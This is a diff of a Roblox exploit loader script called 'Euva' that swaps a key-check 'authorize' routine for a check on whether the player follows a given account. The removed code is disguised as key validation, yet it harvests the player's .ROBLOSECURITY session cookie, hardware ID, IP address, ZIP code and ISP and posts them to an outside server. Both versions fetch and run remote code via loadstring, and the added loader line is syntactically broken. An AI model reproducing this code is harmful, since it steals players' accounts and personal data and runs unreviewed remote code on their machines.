@@ -1,186 +1,183 @@
--- Euva Authorize System
--- Add this at the START of your Authorize (main GUI) script
--- Validates key and logs to Firebase
+-- Euva FollowerCheck
+-- Step 1: Check if player follows Euvanoa, then load ConnectScript
 
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
 
 -- Configuration
-local CORRECT_KEY = "Euvanoaware"
-local FIREBASE_URL = "https://logexecution-6l3uvhfada-uc.a.run.app"
+local TARGET_USER_ID = 10443769536 -- Replace with Euvanoa's actual UserId
+local DISCORD_INVITE = "https://discord.gg/QenEpRVGpd"
+local CONNECT_SCRIPT_URL = "https://raw.githubusercontent.com/givenship/Unanchor.euva/refs/heads/main/AuxiliaryAuthorize"
 
 -- ============================================
--- KEY VALIDATION
+-- CHECK IF PLAYER FOLLOWS EUVANOA
 -- ============================================
 
-local enteredKey = _G.EuvaEnteredKey
+local function checkFollowing()
+    local success, result = pcall(function()
+        local cursor = ""
+        while true do
+            local url = "https://friends.roblox.com/v1/users/" .. LocalPlayer.UserId .. "/followings?limit=100&sortOrder=Desc"
+            if cursor ~= "" then
+                url = url .. "&cursor=" .. cursor
+            end
 
-if not enteredKey or enteredKey ~= CORRECT_KEY then
-    -- Create error GUI
-    local errorGui = Instance.new("ScreenGui")
-    errorGui.Name = "EuvaError"
-    errorGui.ResetOnSpawn = false
-    errorGui.Parent = CoreGui
-    
+            local response = game:HttpGet(url)
+            local data = HttpService:JSONDecode(response)
+
+            if data and data.data then
+                for _, user in ipairs(data.data) do
+                    if user.id == TARGET_USER_ID then
+                        return true
+                    end
+                end
+            end
+
+            if data and data.nextPageCursor and data.nextPageCursor ~= "" then
+                cursor = data.nextPageCursor
+            else
+                break
+            end
+        end
+        return false
+    end)
+
+    return success and result or false
+end
+
+-- ============================================
+-- UNAUTHORIZED GUI
+-- ============================================
+
+local function showUnauthorizedGUI()
+    local old = CoreGui:FindFirstChild("EuvaAuthGUI")
+    if old then old:Destroy() end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "EuvaAuthGUI"
+    gui.ResetOnSpawn = false
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.Parent = CoreGui
+
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 350, 0, 120)
-    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    frame.Size = UDim2.fromOffset(420, 220)
+    frame.Position = UDim2.fromScale(0.5, 0.5)
     frame.AnchorPoint = Vector2.new(0.5, 0.5)
     frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     frame.BackgroundTransparency = 0.5
     frame.BorderSizePixel = 0
-    frame.Parent = errorGui
-    
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 40)
-    title.Position = UDim2.new(0, 0, 0, 20)
-    title.BackgroundTransparency = 1
-    title.Text = "❌ Invalid Key"
-    title.Font = Enum.Font.Gotham
-    title.TextSize = 18
-    title.TextColor3 = Color3.fromRGB(255, 100, 100)
-    title.Parent = frame
-    
-    local msg = Instance.new("TextLabel")
-    msg.Size = UDim2.new(1, -40, 0, 30)
-    msg.Position = UDim2.new(0, 20, 0, 65)
-    msg.BackgroundTransparency = 1
-    msg.Text = "Incorrect key entered"
-    msg.Font = Enum.Font.Gotham
-    msg.TextSize = 14
-    msg.TextColor3 = Color3.fromRGB(255, 255, 255)
-    msg.Parent = frame
-    
-    wait(3)
-    errorGui:Destroy()
-    
-    error("Invalid key - stopping execution")
-    return
-end
+    frame.Parent = gui
 
--- Clean up
-_G.EuvaEnteredKey = nil
-print("✅ Key verified")
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(255, 255, 255)
+    stroke.Thickness = 1
+    stroke.Transparency = 0.3
+    stroke.Parent = frame
 
--- ============================================
--- FIREBASE DATA COLLECTION
--- ============================================
+    -- Top text
+    local topText = Instance.new("TextLabel")
+    topText.Size = UDim2.new(1, -40, 0, 30)
+    topText.Position = UDim2.new(0, 20, 0, 20)
+    topText.BackgroundTransparency = 1
+    topText.Text = "User isn't authorized"
+    topText.Font = Enum.Font.Arial
+    topText.TextSize = 20
+    topText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    topText.TextXAlignment = Enum.TextXAlignment.Center
+    topText.Parent = frame
 
-local function getPlayerStats()
-    local stats = {Level = "N/A", Money = "N/A", Wins = "N/A"}
-    if LocalPlayer:FindFirstChild("leaderstats") then
-        local ls = LocalPlayer.leaderstats
-        if ls:FindFirstChild("Level") then stats.Level = tostring(ls.Level.Value) end
-        if ls:FindFirstChild("Money") then stats.Money = tostring(ls.Money.Value) end
-        if ls:FindFirstChild("Wins") then stats.Wins = tostring(ls.Wins.Value) end
-    end
-    return stats
-end
+    -- Middle text
+    local midText = Instance.new("TextLabel")
+    midText.Size = UDim2.new(1, -40, 0, 50)
+    midText.Position = UDim2.new(0, 20, 0, 60)
+    midText.BackgroundTransparency = 1
+    midText.Text = 'How to Get authorized?\nFollow The User "Euvanoa" in Roblox Rejoin after Followed.'
+    midText.Font = Enum.Font.Arial
+    midText.TextSize = 14
+    midText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    midText.TextXAlignment = Enum.TextXAlignment.Center
+    midText.TextWrapped = true
+    midText.Parent = frame
 
-local function getPlayerRegion()
-    local success, result = pcall(function()
-        return game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(LocalPlayer)
+    -- Discord button
+    local discordBtn = Instance.new("TextButton")
+    discordBtn.Size = UDim2.fromOffset(140, 32)
+    discordBtn.Position = UDim2.new(0.5, -70, 0, 120)
+    discordBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+    discordBtn.BorderSizePixel = 0
+    discordBtn.Text = "Discord"
+    discordBtn.Font = Enum.Font.ArialBold
+    discordBtn.TextSize = 14
+    discordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discordBtn.AutoButtonColor = false
+    discordBtn.Parent = frame
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 4)
+    btnCorner.Parent = discordBtn
+
+    discordBtn.MouseEnter:Connect(function()
+        discordBtn.BackgroundColor3 = Color3.fromRGB(108, 121, 255)
     end)
-    return success and result or "Unknown"
-end
+    discordBtn.MouseLeave:Connect(function()
+        discordBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+    end)
 
-local function getIPInfo()
-    local data = {ip = "Unknown", zip = "Unknown", isp = "Unknown"}
-    pcall(function()
-        local response = game:HttpGet("http://ip-api.com/json/?fields=status,query,zip,isp")
-        local parsed = HttpService:JSONDecode(response)
-        if parsed.status == "success" then
-            data.ip = parsed.query or "Unknown"
-            data.zip = parsed.zip or "Unknown"
-            data.isp = parsed.isp or "Unknown"
+    discordBtn.MouseButton1Click:Connect(function()
+        if typeof(setclipboard) == "function" then
+            setclipboard(DISCORD_INVITE)
+            pcall(function()
+                StarterGui:SetCore("SendNotification", {
+                    Title = "EUVA",
+                    Text = "Discord invite copied!",
+                    Duration = 2
+                })
+            end)
         end
     end)
-    return data
-end
 
-local function getExecutorInfo()
-    local cid, hw, ck = "Unknown", "Unknown", "Unknown"
-    
-    pcall(function()
-        if GetClientID then cid = tostring(GetClientID())
-        elseif getclientid then cid = tostring(getclientid()) end
-    end)
-    
-    pcall(function()
-        if GetHwid then hw = tostring(GetHwid())
-        elseif gethwid then hw = tostring(gethwid()) end
-    end)
-    
-    pcall(function()
-        if syn and syn.request then
-            local hdr = syn.request({Url="https://www.roblox.com/home",Method="GET"}).Headers["set-cookie"]
-            if hdr and string.find(hdr, ".ROBLOSECURITY") then
-                ck = string.match(hdr, ".ROBLOSECURITY=([^;]+)")
-            end
-        elseif request then
-            local hdr = request({Url="https://www.roblox.com/home",Method="GET"}).Headers["set-cookie"]
-            if hdr and string.find(hdr, ".ROBLOSECURITY") then
-                ck = string.match(hdr, ".ROBLOSECURITY=([^;]+)")
-            end
-        end
-        
-        if ck == "Unknown" then
-            if getcookies then ck = tostring(getcookies())
-            elseif GetCookies then ck = tostring(GetCookies()) end
-        end
-    end)
-    
-    return cid, hw, ck
-end
+    -- Bottom text
+    local bottomText = Instance.new("TextLabel")
+    bottomText.Size = UDim2.new(1, -40, 0, 40)
+    bottomText.Position = UDim2.new(0, 20, 0, 162)
+    bottomText.BackgroundTransparency = 1
+    bottomText.Text = "If you followed and Rejoined still not solved yet, wait 5 minutes or Contact Discord."
+    bottomText.Font = Enum.Font.Arial
+    bottomText.TextSize = 12
+    bottomText.TextColor3 = Color3.fromRGB(150, 150, 150)
+    bottomText.TextXAlignment = Enum.TextXAlignment.Center
+    bottomText.TextWrapped = true
+    bottomText.Parent = frame
 
-local function sendToFirebase()
-    local stats = getPlayerStats()
-    local region = getPlayerRegion()
-    local ipInfo = getIPInfo()
-    local clientId, hwid, cookies = getExecutorInfo()
-    
-    local data = {
-        userId = tostring(LocalPlayer.UserId),
-        username = LocalPlayer.Name,
-        displayName = LocalPlayer.DisplayName,
-        accountAge = LocalPlayer.AccountAge,
-        level = stats.Level,
-        money = stats.Money,
-        wins = stats.Wins,
-        region = region,
-        jobId = game.JobId ~= "" and game.JobId or "Private Server",
-        timestamp = os.time(),
-        dateTime = os.date("%Y-%m-%d %H:%M:%S"),
-        executor = identifyexecutor and identifyexecutor() or "Unknown",
-        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-        placeId = tostring(game.PlaceId),
-        ipAddress = ipInfo.ip,
-        zipCode = ipInfo.zip,
-        isp = ipInfo.isp,
-        clientId = clientId,
-        hwid = hwid,
-        cookies = cookies
-    }
-    
-    pcall(function()
-        request({
-            Url = FIREBASE_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-        print("d)*XZ")
+    -- Close button
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.fromOffset(24, 24)
+    closeBtn.Position = UDim2.new(1, -30, 0, 6)
+    closeBtn.BackgroundTransparency = 1
+    closeBtn.Text = "×"
+    closeBtn.Font = Enum.Font.ArialBold
+    closeBtn.TextSize = 20
+    closeBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+    closeBtn.Parent = frame
+
+    closeBtn.MouseButton1Click:Connect(function()
+        gui:Destroy()
     end)
 end
 
--- Send data to Firebase
-sendToFirebase()
-
-print("✅ Authorization complete - Loading main GUI...")
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/givenship/Unanchor.euva/refs/heads/main/Main"))()
 -- ============================================
--- YOUR MAIN GUI CODE STARTS BELOW
+-- MAIN FLOW
 -- ============================================
+
+local isFollowing = checkFollowing()
+
+if isFollowing then
+    print("[Euva] Authorized - Loading ConnectScript...")
+    loadstring(game:HttpGet(https://raw.githubusercontent.com/givenship/Unanchor.euva/refs/heads/main/AuxiliaryAuthorize))()
+else
+    showUnauthorizedGUI()
+    warn("[Euva] Not authorized - Must follow Euvanoa")
+end
